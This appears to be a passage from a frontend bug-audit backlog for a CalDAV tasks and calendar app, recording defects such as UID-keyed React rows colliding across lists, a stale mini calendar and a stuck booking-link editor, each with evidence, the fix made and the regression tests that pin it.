The Stage-4 remediation keyed the desktop EVENT chip as `${e.calendar}::${e.id}` and added a regression test for exactly that one element. The other four render sites the same finding named — the desktop TASK chip, the mobile dots (both kinds), the mobile agenda (both kinds) and DayPopover (both kinds) — were left keying on `e.id` / `t.uid`. A CalDAV UID is unique per collection, not per account, and the trust model treats Tasks.org/DAVx5/Thunderbird as equal-rights writers, so copying a task between two lists or an event between two calendars still produces two children with one key. React drops the duplicate from the key map, so it is torn down and recreated on every update and click handlers can bind to the wrong instance. The related `applyLocal`/`del` scoping the same entry called "the follow-on fix" is also still absent — both still match on `e.uid !== uid` with no collection component, so deleting the Work copy optimistically removes the Personal copy from the grid.

<details><summary>Evidence</summary>

```
Still bare (verified in the current tree):
  CalendarView.tsx:614  <div key={t.uid} className={`cal-task ...`}>          // desktop task chip
  CalendarView.tsx:545  <i key={e.id} className={`ev-dot ...`} />            // mobile dots
  CalendarView.tsx:548  <i key={t.uid} className="ev-dot task" />
  CalendarView.tsx:648  <AgendaEvent key={e.id} .../>                        // mobile agenda
  CalendarView.tsx:652  <AgendaTask  key={t.uid} .../>
  DayPopover.tsx:103    <AgendaEvent key={e.id} .../>                        // "+N more" popover
  DayPopover.tsx:106    <AgendaTask  key={t.uid} .../>
Fixed: CalendarView.tsx:565  <div key={`${e.calendar}::${e.id}`} className={`cal-ev ...`}>

Probe against the real components (vitest):
  two lists tl1/tl2 each holding uid 't1' due 2026-03-04, both opted onto the calendar
    -> 2 .cal-task chips, console.error 'Encountered two children with the same key'  = true
  two calendars c1/c2 each holding uid 'shared' on 2026-03-04, opened via '+N more'
    -> 6 .agenda-ev rows, console.error 'Encountered two children with the same key' = true
The existing stage-4 test ('renders both copies when one UID lives in two calendars') passes because it only inspects the desktop .cal-ev chips.
```

</details>

**Suggested fix.** Apply the same key at the remaining sites: `${t.list}::${t.uid}` for tasks and `${e.calendar}::${e.id}` for events, in the task chip, both mobile-dot maps, both mobile-agenda maps and both DayPopover maps. Extend the stage-4 test to assert no duplicate-key warning for (a) one task uid in two lists and (b) the day popover, and scope `applyLocal`/`del` by `e.calendar` as the original finding's suggested fix already spelled out.

**Fixed** at all six sites, with one vocabulary rather than three. `taskKey`
(order.ts) is unchanged and now used everywhere; a new `eventKey` in calendar.ts
is its twin, and `HomeView`'s ad-hoc `${t.list}:${t.uid}` — which collides for any
list id containing a colon — moved onto it. NUL, not `::`: an event `id` already
contains `::` for a recurrence instance, so that separator is ambiguous exactly
where it matters. A React key never reaches the DOM, so nothing renders it.

The `applyLocal`/`del` half this entry's suggested fix names is done too, scoped
by the event's collection href with a `!href ||` fallback — `calHref` answers ''
until the calendar list has loaded, and without the fallback every optimistic
paint on a cold grid would match nothing while still reporting success, so
nothing would reload to cover for it. There is a control for exactly that.

Widened first with the mobile EVENT dot and agenda row (the original duplicated a
task uid on the mobile leg, so two of the six sites were undriven) and with the
scoping half, which had no assertion at all. Half-fix checked: fixing the keys and
leaving the mutations on the bare uid — the key warnings go away and the two
delete pins still fail.

**Pinned by** `aug19 stage 4b — chip, dot, agenda and popover identity > gives every task chip and every popover row a key unique per collection`, `… > gives every event dot and mobile agenda row a key unique per collection` and `… > removes only the calendar copy that was deleted` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

### Home & scheduling views

#### [x] The Home mini calendar never refetches on an SSE change, so its dots go stale while every other module on the same dashboard updates

`frontend/src/components/HomeView.tsx:141` · **medium** · bug · stage 4

HomeView's event fetch effect has a dependency array containing only `needsCal`, `from`, `to` and the joined calendar-id string — all of which are invariant under `rev`. `rev` is the SSE change signal (App.tsx:400-405) and every other data source on the dashboard consumes it: `useTaskData` refetches on `[loadKey, rev, enabled, listsLoaded]` (data.tsx:205), the scheduling modules refetch on `[rev, needsSched]` (HomeView.tsx:162), and `CalendarProvider` refetches `api.calendars()` on `[rev, enabled]`. `requestWindow` even stamps its dedupe key with `rev` (`const stamp = `${rev}|${forCals.map(c=>c.id).join(',')}``, data.tsx:575) specifically so a rev bump forces a refetch — but that check is never consulted because the effect that calls it never re-runs. The author's intent is visible one line earlier: `days = useMemo(() => monthGrid(new Date()), [rev])` puts `rev` in the memo deps, yet `from`/`to` are derived strings that come out identical, so the dep array is unchanged. The staleness only clears when HomeView unmounts and remounts (a tab switch), because `asked` lives in the provider above the tabs.

<details><summary>Evidence</summary>

````
HomeView.tsx:137-141:
```
useEffect(() => {
  if (!needsCal) return
  requestWindow(from, to, wanted)
  // eslint-disable-next-line react-hooks/exhaustive-deps
}, [needsCal, from, to, wanted.map((c) => c.id).join(',')])
```
Verified against the real component (temporary vitest probe, since deleted): render `<HomeView layout=[{kind:'mini_calendar'}]>` inside `<DataProvider rev={0}>`, wait for `api.events` to be called once, then rerender with `rev={1}` (the exact shape the existing test at HomeView.test.tsx:403 uses for the scheduling modules). Result: `api.calendars` is called twice (the provider did react to rev) but `api.events.mock.calls.length` stays at **1**, and the day button's accessible name still reads "…, 1 event" after the mock was changed to return two events.

Failure scenario: the user leaves the Home tab open (which is what a dashboard is for). Another CalDAV client — DAVx5/jtx, or the user's phone — adds a meeting to an existing calendar. Radicale's hook fires `/internal/changed`, the SPA gets the SSE event, `rev` bumps, Today/Overdue/Upcoming/Recently-completed/Booking links all repaint with fresh data, and the mini calendar keeps showing the pre-change dots and the pre-change "N events" popover forever. Only a change that alters the *set of calendar ids* (a calendar created or deleted) refreshes it, because that is the only thing that mutates the dep string.
````

</details>

**Suggested fix.** Add `rev` to the effect's dependency array (and thread `rev` down from the props — it is already a prop on HomeView). `requestWindow`'s `asked` stamp already includes `rev`, so this costs exactly one refetch per change burst and nothing on ordinary re-renders. CalendarView.tsx:242 carries the identical dep array and the same defect; it is partly masked there because CalendarView calls `reloadHere()` after its own writes, while the mini calendar is read-only and has no such path.

**Fixed** at BOTH sites named here — the mini calendar and the CalendarView twin
— by adding `requestWindow` to the two dependency arrays rather than `rev`. The
signal was already in the callback: `requestWindow` is a `useCallback` over
`[rev, enabled, fetchWindow]`, so its identity changes on every bump. Threading
`rev` in separately (as suggested) would work, but it puts a second source of
truth beside one the effect already closes over, and leaves the dep array still
not naming what the effect reads. Deduping is unaffected — `asked` is stamped
with `rev`, so a re-run within one rev is a no-op, and the pin asserts that.

The twin was pinned by nothing at all before this; it has its own pin now (`the
calendar tab repaints when the account changes under it`), which fails against a
half-fix that repairs only HomeView. It is the same finding rather than a second
one: this entry's own suggested fix names it, and the calendar tab is the bigger
surface, being where a user watches for what their other clients wrote.

**Pinned by** `2026-08-19 — the Home mini calendar > repaints when the account changes under an open dashboard` and `… > the calendar tab repaints when the account changes under it` in `frontend/src/backlog.aug19.stage4a.test.tsx`.

#### [x] A rejected booking-link save leaves the editor permanently disabled — the in-flight guard is set but never cleared, and the whole form is unrecoverable

`frontend/src/components/SchedulingView.tsx:225` · **medium** · bug · stage 4

`LinkModal.save()` sets `saving = true` before calling `onSave(...)`, and nothing ever sets it back to false. `onSave` is typed `(body, token?) => void`, so the modal cannot observe the outcome; the real handler (`SchedulingView.save`, line 68-76) awaits `guard(...)`, which returns `undefined` on any failure, and in that case does NOT call `setEditing(null)` — the modal deliberately stays open so the user can fix and retry. But `saving` is now stuck true forever, so `disabled={!valid || saving}` keeps the Create/Save button dead, and the Enter-key handler (`onKeyDown` on the title field, line 262) returns immediately at `if (!valid || saving) return`. The only way out is Escape / the ✕, which unmounts LinkModal and discards every piece of state: title, description, timezone, buffers, notice, horizon, and the entire seven-day availability grid the user just filled in. The existing regression test (backlog.stage4.test.tsx:200) resolves `createSchedulingLink` with a truthy `{}` and therefore only ever exercises the success path — the double-click guard it pins is real, but the reset half of the contract is untested.

<details><summary>Evidence</summary>

````
SchedulingView.tsx:221-238:
```
const [saving, setSaving] = useState(false)
const save = () => {
  if (!valid || saving) return
  setSaving(true)
  onSave({ ... }, link?.token)      // fire-and-forget; no completion callback
}
```
SchedulingView.tsx:68-76:
```
const save = async (body, token?) => {
  const saved = await guard(() => token ? api.patchSchedulingLink(...) : api.createSchedulingLink(body))
  if (saved) { setLinks(...); setEditing(null) }   // failure: modal stays open, saving still true
}
```
Verified with a temporary vitest probe (since deleted) against the real component: mock `api.createSchedulingLink` to reject with `new HttpError(422, 'availability ranges overlap on weekday 0')`, open "New link", type a title, click "Create link". After the rejection the dialog is still mounted and `(createButton as HTMLButtonElement).disabled === true`; a second click produces no further call (`createSchedulingLink.mock.calls.length` stays 1).

Realistic triggers, all common: (a) a typo in the free-text Timezone field — `_normalize_link_fields` raises `ValueError(f"unknown timezone …")` → 422 (service.py:670-674); (b) overlapping availability windows → 422 (scheduling.py:92-95); (c) a dropped connection or a 502 from the tunnel. In every case the user sees a toast, then a form that will not submit and cannot be edited back into life.
````

</details>

**Suggested fix.** Make the contract observable: type `onSave` as `(body, token?) => Promise<boolean>` (or `Promise<void>` that rejects), have `SchedulingView.save` return whether it succeeded, and in `LinkModal.save` do `setSaving(true); try { const ok = await onSave(...) } finally { if (!ok) setSaving(false) }`. Add a test that rejects the create and asserts the button is re-enabled and a retry reaches the API.

**Fixed** as suggested — `onSave` is now `(body, token?) => Promise<boolean>`
and `SchedulingView.save` returns whether the write landed — with one deliberate
departure from the suggested shape: `saving` is cleared on FAILURE only, not in a
`finally`. A `finally` sets state on a modal the success path has already
unmounted, and, worse, it invites `save` to return `true` unconditionally, which
puts the button back while leaving the editor exactly as broken. That is the
half-fix that was run, and both pins catch it — with one exception a later review
found and this entry originally overstated: `save` returning `true`
unconditionally *and* clearing `saving` in a `finally` passes both pins. React 18
no-ops the `setState` on the unmounted success path, so that spelling has no
user-visible consequence, and it is recorded here as an inaccuracy in this note
rather than as a hole in the tests.

Widened with the EDIT path (`patchSchedulingLink`, which the finding names and
the original pin never reached) and a control asserting the form survives the
rejection — the modal is deliberately left open to retry, so a repair that
re-enables the button by remounting it would satisfy both pins and throw the
form away, the same loss one step later.

**Pinned by** `2026-08-19 — the booking-link editor > comes back to life when the save is rejected` and `… > comes back to life when an edit is rejected` in `frontend/src/backlog.aug19.stage4a.test.tsx`.

#### [x] The availability editor lets the owner build overlapping weekly windows the server rejects with a 422, and silently deletes any window whose end precedes its start

`frontend/src/components/SchedulingView.tsx:178` · **medium** · bug · stage 4

`daysToAvail` is the client's whole validation of the weekly grid, and it implements exactly one of `parse_availability`'s two per-day rules. It filters `s && e && s < e` — mirroring the server's `if s >= e: raise ValueError(...)` — but it does not check the overlap rule that sits four lines below it in the same server function, so two ranges on one day are serialized and sent verbatim. The result is a 422 the UI has no way to anticipate, delivered as a raw toast ("Couldn't save your preferences"-style: `availability ranges overlap on weekday 0`), and because of the stuck-`saving` defect above, that 422 also bricks the editor. The other half of the mismatch is the reverse: an inverted range is DROPPED rather than reported. A user who types Friday 17:00–09:00 (a night shift, or simply the two fields entered backwards) gets no error at all; the day is silently omitted from `availability`, the link is created advertising no Friday slots, and reopening the editor shows Friday as "Unavailable" — the range they typed is gone with no record it was ever rejected. If the inverted range is the only enabled day, `valid` (line 215-216) silently goes false and the Create button greys out with title, calendar and timezone all filled and nothing on screen explaining why.

<details><summary>Evidence</summary>

````
SchedulingView.tsx:174-182:
```
const daysToAvail = (days: DayRanges[]): Availability => {
  const av: Availability = {}
  days.forEach((d, i) => {
    if (!d.on) return
    const rs = d.ranges.filter(([s, e]) => s && e && s < e).map(([s, e]) => `${s}-${e}`)
    if (rs.length) av[String(i)] = rs
  })
  return av
}
```
backend/tasksd/scheduling.py:88-95 — the two rules the client only half-implements:
```
if s >= e:
    raise ValueError(f"availability range {r!r} must start before it ends")
parsed.append((s, e))
...
for (_, prev_end), (nxt_start, _) in zip(parsed, parsed[1:]):
    if nxt_start < prev_end:
        raise ValueError(f"availability ranges overlap on weekday {day}")
```
Overlap scenario, entirely through the UI: open "New link", Monday defaults to 09:00–17:00, click "+ range" (line 316-319, which appends `['','']`), type 10:00–12:00 into it. `valid` is true, the button is enabled, and the PATCH/POST body carries `availability: {"0": ["09:00-17:00", "10:00-12:00"]}`. Server: 422 `availability ranges overlap on weekday 0`. Note that exactly-adjacent ranges (09:00-12:00 + 12:00-15:00) are fine server-side, so the user has no way to infer the rule from behaviour.
Inverted scenario: set Friday to 17:00–09:00 and save. 201 Created, `availability` has no key "4", and `availToDays` (line 168-172) reads the round-tripped payload back as `{on: false}` — Friday now reads "Unavailable".
````

</details>

**Suggested fix.** Move the overlap check client-side next to the `s < e` filter (sort each day's ranges and reject `next.start < prev.end`), and surface both failures inline on the offending day rather than dropping them: mark the range invalid, fold it into `valid`, and say why. The two rules belong in one place — they are already one function on the server.

**Fixed** with a new exported `availErrors(days)` mirroring `parse_availability`
exactly — both fields filled, `s < e` STRICTLY (equal endpoints are illegal there
too), and no overlap once the day's ranges are SORTED, so submission order does
not matter and exactly adjacent ranges are LEGAL. That last rule has a control:
a `<=` on the client would refuse a lunch break the server accepts, which is this
same defect pointing the other way.

`daysToAvail` now drops only the wholly-untouched "+ range" placeholder. The
`s < e` filter that lived there was the silent discard, and moving the rule into
`availErrors` is what makes the difference between refusing an inverted range and
deleting it.

**The pin had an escape hatch, and removing it is most of the value here.** Its
assertions were wrapped in `if (sent) { … }`, so a fix that merely refuses to
submit executed ZERO assertions and passed — it could not tell "refused and
explained" from "refused silently and threw the range away". Split into three
tests whose assertions run in BOTH branches: if nothing was submitted, the values
the user typed must still be on screen and the day must say why. Run against a
half-fix that validates the overlap but keeps `daysToAvail`'s filter, the overlap
pin still passes and `never drops a range the user typed backwards` is what
fails — the exact assertion the hatch used to hide.

**Pinned by** `2026-08-19 — the booking-link editor > never submits a week the server will refuse` and `… > never drops a range the user typed backwards` in `frontend/src/backlog.aug19.stage4a.test.tsx`.

#### [x] packDown can stack modules past MAX_ROWS, producing a y the server's `le=200` rejects — the whole settings PUT 422s and the arrangement is never saved

`frontend/src/dashboard.ts:93` · **low** · bug · `minor` · stage 4

`clampToGrid` bounds each module's y to `MAX_ROWS = 200`, but `packDown` runs AFTER the clamp and re-derives y by stacking (`while (placed.some(p => overlaps(p, {...m, y}))) y++`, plus the pinned push `placed[i] = {...placed[i], y: m.y + m.h}`). Nothing re-clamps the stacked result, so `sanitizeLayout` — the function whose entire job is to hand the caller a legal layout — can emit y values well above 200. `DashboardModule.y` on the server is `Field(ge=0, le=200)` (backend/tasksd/app.py:381), so the settings PUT is rejected wholesale: `saveSettingsSoon` batches the dashboard with anything else written in the same 400 ms window, so those preferences are lost too, and the user gets `Couldn't save your preferences: dashboard.6.y: Input should be less than or equal to 200` on every subsequent dashboard change. The comment directly above MAX_ROWS documents this exact failure mode being fixed for `h` ("clamping HEIGHT to 200 rows let the editor build a module the server's `h: le=40` rejects, so the whole settings PUT 422'd and the layout was silently kept local and lost on reload") and asserts the two bounds are now separate — but the separation only holds pre-pack; the post-pack y is unbounded. App.test.tsx:462 mocks precisely this class of 422 for `dashboard.0.h`, so the failure mode is known; the y half was missed.

<details><summary>Evidence</summary>

````
dashboard.ts:62-66 and 93-118. Reproduced against the compiled module (esbuild → node):
```
let mods = []; let i = 0
for (const k of MODULE_KINDS) mods = addModule(mods, k, `m${i++}`)   // all 8 kinds
for (const m of [...mods]) mods = resizeModule(mods, m.id, 12, 40)  // full width, max height
sanitizeLayout(mods)
```
Output y values: 0, 40, 80, 120, 160, **200, 240, 280** — the last three modules carry y > 200 and the last two are outright rejected by the server model. Every one of those geometries is reachable through the editor: `resizeModule` itself clamps w to 12 and h to 40, so each individual module is legal; it is only the stack that overflows.

Failure scenario: the user adds all eight modules and stretches them to full width and near-full height on a large display (the grip drag accumulates across gestures, so no single 2240 px drag is needed). From that point on every drag, resize, add or remove 422s: the toast fires, `setDashboard(next)` has already painted locally, and the arrangement disappears on the next reload with the modules back where they were.
````

</details>

**Suggested fix.** Clamp in `packDown` after the stacking loops — e.g. `placed.push({ ...m, y: Math.min(MAX_ROWS, y) })` and the same bound on the pinned push — or re-run `clampToGrid` over `packDown`'s output inside `sanitizeLayout`. Either is a couple of lines; add a dashboard.test.ts case asserting `sanitizeLayout(...).every(m => m.y <= 200)` for a maximal layout.

**Fixed** in `packDown` itself, at both push sites — and the pinned branch's
`while` became an `if` first, which is not a style change: one push always clears
the overlap by construction, and with the clamp added a `while` can never
terminate, because a clamped `y` can still overlap. That repair hangs the test
run rather than failing it, which reads like infrastructure trouble.

Widened past `sanitizeLayout`, which is not what the app PUTs: `HomeView` holds
the result of `moveModule`/`resizeModule`/`addModule`/`removeModule` as its live
layout and sends that, so an intermediate is what 422s the settings write. The
half-fix — clamp in `sanitizeLayout` only — leaves the original pin passing and is
caught by the editing-operations case. A control keeps a pinned module on the row
the drag put it on, so a repair that drops the pinned branch cannot pass.

Consequence worth stating: two modules can now share a row at the very bottom of
a 200-row grid. That is reachable only from an absurd layout and is strictly
better than losing the whole settings write.

**Pinned by** `aug19 stage 4b — the dashboard grid > never emits a module below the row the server accepts` and `… > never emits a module below that row from any editing operation` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

### Tasks view

#### [x] sortTasks keys its effective-position map by bare uid, so one task copied into a second list silently rewrites another task's manual drag position

`frontend/src/order.ts:128` · **medium** · bug · `minor` · stage 3

`sortTasks` assigns every task one effective position in a `Map<string, number>` keyed by `t.uid`. The array it is given is the merged multi-list set (`data.tsx:200-202` flattens `api.tasks(l.id)` over every list), and the backend keys items on `(collection_href, uid)` (db/schema.sql:73), so the same UID genuinely can appear twice — copying a VTODO between lists in Tasks.org/DAVx5/Thunderbird preserves the UID, and the trust model treats those clients as equal-rights writers. When one copy is manually placed (`sort_order != null`) and the twin is not, the unplaced-task loop at line 130-135 overwrites the placed copy's entry (`at.set(t.uid, ...)`), so the row the user dragged into position jumps somewhere else on every render. It is not cosmetic: `data.tsx:457` builds the payload for POST /api/tasks/reorder from `sortTasks(tasks)`, so the next drag persists the scrambled sequence for the whole account. The same uid-keyed assumption breaks the reorder rollback map at data.tsx:476 (`new Map(tasks.map(t => [t.uid, t.sort_order]))` collapses the two copies onto one entry, so a failed reorder restores the wrong position to one of them).

<details><summary>Evidence</summary>

````
order.ts:127-138
```ts
const at = new Map<string, number>()
placed.forEach((t, i) => at.set(t.uid, i))
for (const t of tasks) {
  if (t.sort_order != null) continue
  const next = placed.findIndex((p) => compareIntrinsic(t, p) < 0)
  at.set(t.uid, next < 0 ? placed.length : next - 0.5)   // <- clobbers the placed twin
}
return [...tasks].sort((a, b) => (at.get(a.uid)! - at.get(b.uid)!) || compareIntrinsic(a, b))
```
Reproduced (vitest, order.test.ts's own `task` factory):
```ts
const a = task({ uid: 'a', list: 'l1', sort_order: 1, summary: 'Alpha' })
const b = task({ uid: 'b', list: 'l1', sort_order: 2, summary: 'Bravo' })
const c = task({ uid: 'c', list: 'l1', sort_order: 3, summary: 'Charlie' })
const twin = task({ uid: 'a', list: 'l2', summary: 'Zulu (Home copy of Alpha)' })
sortTasks([a, b, c, twin])
// -> ['l1/Bravo', 'l1/Charlie', 'l1/Alpha', 'l2/Zulu']
```
Alpha was dragged to the top of the list; because a Home copy carrying the same UID sorts after everything intrinsically, `at` gets 'a' -> 3 and Alpha falls to third. Nothing the user does in the Work list can fix it, and one further drag POSTs that order to /api/tasks/reorder, making it the stored order. order.test.ts has no case with two tasks sharing a uid (or with equal sort_order values).
````

</details>

**Suggested fix.** Key the map on the collection-qualified identity, e.g. `const k = (t: Task) => `${t.list}\0${t.uid}`` used in the two `at.set` calls and both `at.get` lookups, and add a duplicate-uid case to order.test.ts. The same qualification is needed for the rollback map in data.tsx:476.

**Pinned by** `aug19 stage 3 — sortTasks with a uid in two lists > keeps a dragged row where it was dropped when a copy shares its uid` in `frontend/src/backlog.aug19.stage3.test.tsx`.

#### [x] Folding one subtask tree silently deletes the folded state of every tree that is not currently rendered — and the loss is written to the server

`frontend/src/components/TasksView.tsx:297` · **medium** · bug · `minor` · stage 3

`setCollapsed` prunes the account-synced `collapsed_tasks` set against `kidRows`, which the comment above it describes as "uids that still name a task with children". It is not that: `kidRows` is built from `shownTasks` (hidden lists filtered out) and only for rows where `parentIsRendered(t)` is true, which consults `showCompleted`. So it means "uids that have a child RENDERED RIGHT NOW". Any folded tree that lives in a hidden list, or whose parent is completed while the default `showCompleted={false}` is in force, is absent from `kidRows` and is therefore dropped from the set the moment the user folds or unfolds anything else. `onCollapsedTasksChange` goes straight to `App.changeCollapsedTasks` -> `saveSettingsSoon({collapsed_tasks: next})`, so the loss is persisted to the account and survives reload and follows the user to another browser. The comment is the only thing that makes the line look correct; the map that actually matches the comment (`kidsByParent`, built from all `tasks` at line 202-217) is already in scope.

<details><summary>Evidence</summary>

````
TasksView.tsx:295-299
```ts
const setCollapsed = useCallback((uid: string, next: boolean) => {
  if (next === collapsedSet.has(uid)) return
  const kept = collapsedTasks.filter((x) => x !== uid && kidRows.has(x))
  onCollapsedTasksChange(next ? [...kept, uid] : kept)
}, [collapsedSet, collapsedTasks, kidRows, onCollapsedTasksChange])
```
kidRows (line 272-286) iterates `shownTasks` and skips anything where `!parentIsRendered(t)`; `rendersUnder` (line 240-244) returns undefined when the parent is done and `showCompleted` is false, and `shownTasks` (line 183) drops every task in a hidden list.

Reproduced against the real component (vitest, harness copied from TasksView.test.tsx's `setup`), both cases FAIL on current main:
(a) lists l1 'Work' and l2 'Home'; hiddenLists=['l2']; tasks: w1+child w2 in l1, h1+child h2 in l2; collapsedTasks=['h1']. Click "Hide subtasks of Work parent" -> onCollapsedTasksChange called with `['w1']`, not `['h1','w1']`. 'h1' is gone forever.
(b) one list; tasks: w1+child w2 (open), d1+child d2 with d1 completed; showCompleted=false; collapsedTasks=['d1']. Click "Hide subtasks of Work parent" -> onCollapsedTasksChange called with `['w1']`, not `['d1','w1']`.

User-visible: hide the Home list, fold a couple of Work trees, unhide Home — every Home tree you had folded is now expanded, permanently. The existing test ("drops a stored uid that no longer names a task with children", TasksView.test.tsx:873) only exercises one visible list with no completed parents, so it passes while asserting nothing about this.
````

</details>

**Suggested fix.** Prune against the parent map built from all tasks rather than from what is on screen: `const kept = collapsedTasks.filter((x) => x !== uid && kidsByParent.has(x))` (and swap `kidRows` for `kidsByParent` in the dep array). `kidsByParent` is built from `tasks` at line 202-217 and is exactly "uid names a task that has children in its own list". Add tests for the hidden-list and completed-parent cases.

**Pinned by** `aug19 stage 3 — folding a tree while another list is hidden > keeps a hidden list’s folded trees when another tree is folded` in `frontend/src/backlog.aug19.stage3.test.tsx`.

#### [x] A bulk row corrected in any field except its title replays the old client_id, so the correction is silently discarded and the modal reports success

`frontend/src/components/AddMultipleModal.tsx:298` · **low** · bug · stage 3

`patchRow` mints a fresh idempotency id only when `summary` changes. Every other property a row carries — due date/time, start, priority, tags, notes, list — and the entire shared strip (`shared`/`sharedOn`, read fresh in `submit` at line 322-325) can be edited between attempts while the row keeps its original `cid`. The backend answers a replayed slug by confirming the resource already written under it (`sync/engine.py:_put_new` swallows the 412 when the occupant carries the same UID and `service.create_task` returns `get_task(...)` — the existing resource, unmodified), so on the failure mode this retry flow exists for (the POST landed, the response was lost over the tunnel) the corrected values never reach the server, `settleCreate` paints the server's old DTO, `bad` is empty and the modal closes as though everything landed. AUDIT closed the same mechanism twice for the title (patchRow, then onPasteTitle); this is the remaining path.

<details><summary>Evidence</summary>

````
AddMultipleModal.tsx:292-300
```ts
const patchRow = (key: string, patch: Partial<Row>) =>
  setRows((rs) => rs.map((r) => {
    if (r.key !== key) return r
    const retitled = patch.summary !== undefined && patch.summary !== r.summary
    return { ...r, ...patch, ...(retitled ? { cid: clientId() } : {}) }
  }))
```
and submit (319-326) sends `cid: r.cid` with a body built from the *current* row + shared values.

Scenario: a three-row batch is submitted; the POST for row 2 lands on Radicale but the 502 from the tunnel means `createMany` records index 1 as failed, the row is kept and the alert says "press Add to retry". The user assumes the due date was the problem, changes the shared "Due date, for all tasks" from 2026-08-10 to 2026-08-11 (or edits that row's Priority), and presses Add. The retry POSTs `{summary:'…', due:'2026-08-11', client_id:<same slug>}`; `_put_new` sees the href occupied by a resource with the same UID, treats it as success, and the task keeps DUE 2026-08-10. `bad` is empty, so the modal closes reporting success. TasksView.test.tsx covers the summary-changed and summary-unchanged paths only (lines 351-389); no test changes a non-title field before a retry.
````

</details>

**Suggested fix.** Regenerating the cid is not the right fix here (that would duplicate on a lost response). Either (a) have the create endpoint report whether it was a replay and, when the row's body differs from the returned DTO, follow with a PATCH of the changed fields, or (b) freeze the non-title fields of a kept row (disable them) until the user either retries as-is or clears the row, so the UI cannot promise an edit it will drop.

**Pinned by** `aug19 stage 3 — correcting a bulk row before a retry > does not close reporting success on a correction the server drops` in `frontend/src/backlog.aug19.stage3.test.tsx`.

#### [x] Tasks pane rows key on the bare UID, so a task copied into a second list produces duplicate React keys and deleting one copy erases both rows

`frontend/src/components/TasksView.tsx:442` · **low** · rendering · `minor` · stage 4

Every row in the Tasks view keys on `t.uid` (list view at 416/442/456, day columns at 642/649/658), and `data.tsx`'s mutations identify a task the same way (`patchLocal`/`settle` at 222-225 map every task whose `uid` matches; `remove` at 382 filters by uid; `dropOnDay` at TasksView.tsx:159 resolves the drag with `tasks.find(x => x.uid === dragUid)`). The tasks array is the merged multi-list set and the backend keys items on `(collection_href, uid)`, so two lists can legitimately hold the same UID. AUDIT closed this exact identity bug for the calendar's event chips ("Calendar chips key on the bare UID…", CalendarView.tsx) and noted HomeView already keys defensively with `${t.list}:${t.uid}` — the tasks pane was never covered and still keys on the bare uid (as do CalendarView's task chips at 548/614/652).

<details><summary>Evidence</summary>

```
TasksView.tsx:442 `<TaskGroup key={t.uid} …>`; data.tsx:382 `setTasks((ts) => ts.filter((x) => x.uid !== t.uid))`.

Reproduced against the real component (vitest): two lists l1 'Work' and l2 'Home', each returning `task({uid: 'shared', list: <id>})`. On first paint React logs "Warning: Encountered two children with the same key". Clicking `del` on the Work row calls `api.deleteTask('l1','shared')` — correct on the wire — but the local filter drops BOTH rows, so the Home task disappears from the pane although it still exists on the server, and only a full refetch brings it back. Likewise `toggle` ticks both rows locally while completing only one, and a drag in the day view can resolve the wrong copy.
```

</details>

**Suggested fix.** Key rows on `${t.list}:${t.uid}` in TasksView (416, 442, 456, 642, 649, 658) as HomeView already does, and scope the provider's optimistic mutations to `(list, uid)` rather than uid alone (data.tsx patchLocal/settle/settleCreate/remove).

**Fixed** on `taskKey` at all seven row sites, and — the half this entry's
suggested fix also names — in the provider's optimistic mutations: `patchLocal`
(which now takes the whole task so the list travels with it), `settle` and
`remove`. Deliberately NOT changed: `settleCreate` and the create/bulk rollbacks,
whose uids come from `uidFor(clientId())` and cannot collide, and `repairParents`,
already guarded by `real.list !== t.list`.

Widened with the case a user hits every day: ticking one copy's box marked BOTH
done on screen, which is worse than the delete because nothing about it looks
destructive. Half-fix checked: fixing the keys alone, which both this pin and the
toggle pin still catch.

`addSub` still resolves its parent by bare uid — it is handed one — and that,
along with `TasksView`'s own uid-keyed maps (`byUid`, `parentByUid`, `kidRows`,
`collapsedSet` and `TaskGroup`'s whole uid-shaped prop surface), is filed
separately rather than smuggled into a keying fix. With one uid in two lists both
rows show one row's subtasks, progress and fold state. See below.

**Pinned by** `aug19 stage 4b — the tasks pane and one uid in two lists > deletes only the copy whose row was clicked` and `… > completes only the copy whose box was ticked` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

#### [x] The Completed pane hides a completed RELATED-TO ring entirely, though the list view has explicit code to render one

`frontend/src/components/TasksView.tsx:334` · **low** · bug · `minor` · stage 4

`tops` goes to some length to handle a RELATED-TO loop authored by another CalDAV client: `parentIsRendered` (line 251-264) walks the chain, detects the ring, elects its lowest uid as the root and renders it. `completedTops`, written later for the dedicated Completed pane, uses a plain one-hop "my parent is not also done" test with no ring handling, so in a cycle every member is excluded and the pane renders "No completed tasks." The tasks are then unreachable in that pane, which is the one surface whose whole job is to show them (with the default `showCompleted={false}` they are not in the main pane either).

<details><summary>Evidence</summary>

````
TasksView.tsx:334-339
```ts
const completedTops = shownTasks.filter((t) => {
  if (!isDone(t)) return false
  const p = parentOf(t)
  const parent = p ? byUid.get(p) : undefined
  return !(parent && isDone(parent))
})
```
Reproduced against the real component (vitest): tasks = [{uid:'a', summary:'Alpha', parent:'b', completed:true}, {uid:'b', summary:'Bravo', parent:'a', completed:true}]; click "View completed" -> the pane renders `<div class="empty">No completed tasks.</div>` and neither Alpha nor Bravo appears. The list view's own cycle test (TasksView.test.tsx:796) shows the main pane handles the same data correctly, so the two panes disagree.
````

</details>

**Suggested fix.** Reuse the ring election the list view already has — e.g. treat a done task as a completed-pane top when its done parent chain loops back to it and it is not the ring's minimum uid — or simply exclude the child only when walking up from the parent does not return to `t`. (`completedKids` at line 340-348 has no cycle guard either; TaskGroup's `seen` set stops the recursion, but a guard there would keep the two consistent.)

**Fixed** by reusing the list view's ring election rather than restating it: the
walk is now `anchorsRing(t, under)`, parameterised by the "renders under"
predicate, and the Completed pane passes its own — done parents only, ignoring
the global `showCompleted` the list view consults. The two rules genuinely
disagree about which parents count (the comment at `TasksView.tsx:337` records
why) and they must not also disagree about rings, which is exactly what happened.

`completedKids` needed no change: `TaskGroup`'s `seen` path already stops the
recursion closing the loop.

Widened first with a THREE-node ring, and that earned its keep immediately. The
obvious repair — a one-hop widening, "a done task is a top when its parent is not
done, or when its parent's parent is itself" — satisfies the original two-node
pin and still loses a→b→c→a completely. Rings arrive from other clients and
nothing on either side of the wire bounds their length. A control asserts that an
ordinary completed child still nests under its completed parent, so a repair that
gives up and flattens the pane cannot pass either.

**Pinned by** `aug19 stage 4b — the Completed pane and a RELATED-TO ring > shows a completed ring another client authored` and `… > shows a completed ring of three the same way` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

#### [x] TaskModal — the app's most-used dialog — has no Escape handler, breaking the modal contract every other dialog in the app keeps

